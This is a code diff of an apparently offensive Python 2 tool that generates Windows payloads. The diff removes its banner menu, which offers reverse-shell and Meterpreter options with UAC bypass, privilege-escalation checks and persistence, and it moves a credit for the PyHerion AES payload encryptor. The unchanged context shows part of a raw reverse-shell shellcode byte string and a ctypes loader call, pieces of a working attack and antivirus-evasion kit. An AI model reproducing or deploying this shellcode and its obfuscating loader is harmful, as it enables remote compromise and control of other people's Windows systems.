@@ -22,26 +22,6 @@ t = blessings.Terminal()
 
 class SHELLCODE(object):
 
-    def MENU(self):
-        print t.clear
-        print '=' * t.width + t.bold_red
-        print " _       ___       ____              __                __".center(t.width)
-        print "   | |     / (_)___  / __ \____ ___  __/ /___  ____ _____/ /____".center(t.width)
-        print "   | | /| / / / __ \/ /_/ / __ `/ / / / / __ \/ __ `/ __  / ___/".center(t.width)
-        print "  | |/ |/ / / / / / ____/ /_/ / /_/ / / /_/ / /_/ / /_/ (__  )".center(t.width)
-        print "  |__/|__/_/_/ /_/_/    \__,_/\__, /_/\____/\__,_/\__,_/____/".center(t.width)
-        print "   /____/".center(t.width)
-        print t.normal + '=' * t.width
-        print ('[1] Windows Reverse Shell' + t.bold_green + '(Stageless)' +
-               t.bold_red + ' [Shellter]').center(t.width - 44) + t.normal
-        print ('[2] Windows Reverse Meterpreter' + t.bold_green + '(Staged)' + t.bold_red +
-               ' [Shellter, UacBypass, Priv Esc Checks, Persistence]').center(t.width) + t.normal
-        print ('[3] Windows Bind Meterpreter' + t.bold_green + '(Staged)' + t.bold_red +
-               ' [Shellter, UacBypass, Priv Esc Checks, Persistence]').center(t.width - 4) + t.normal
-        print ('[4] Windows Reverse Meterpreter HTTPS' + t.bold_green + '(Staged)' +
-               t.bold_red + ' [BETA]').center(t.width - 30) + t.normal
-        print '=' * t.width
-
     windows_rev_shell = (
         "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
         "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
@@ -156,7 +136,7 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 """
 
 
-class FUNCTIONS(object):  # Adaptation of PyHerion 1.0 By: @harmj0y
+class FUNCTIONS(object):
 
     def __init__(self):
         self.BLOCK_SIZE = 32
@@ -179,7 +159,7 @@ class FUNCTIONS(object):  # Adaptation of PyHerion 1.0 By: @harmj0y
     def DecodeAES(self, c, e):
         return c.decrypt(base64.b64decode(e)).rstrip(self.PADDING)
 
-    def DoPyCipher(self, filecontents):
+    def DoPyCipher(self, filecontents): # Adaptation of PyHerion 1.0 By: @harmj0y
         key, iv = self.randKey(32), self.randKey(16)
 
         input = filecontents.split('\n')
